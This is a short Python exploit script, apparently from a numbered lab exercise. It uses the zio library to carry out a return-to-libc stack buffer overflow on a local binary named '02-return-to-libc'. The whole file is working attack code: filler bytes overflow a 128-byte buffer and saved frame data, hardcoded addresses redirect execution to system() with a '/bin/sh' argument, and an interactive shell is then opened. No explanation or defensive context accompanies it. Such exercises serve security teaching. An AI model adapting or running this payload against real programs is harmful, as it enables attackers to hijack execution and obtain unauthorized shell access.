#!/usr/bin/python

import struct

from zio import *

payload = 'a' * 128  # buffer
payload += 'b' * 12  # garbage and old ebp
payload += struct.pack('<I', 0xf7e42190) # system address
payload += 'c' * 4                       # fake return address for system
payload += struct.pack('<I', 0xf7f62a24) # "/bin/sh" address

io = zio("./02-return-to-libc" + " " + payload)
io.interact()
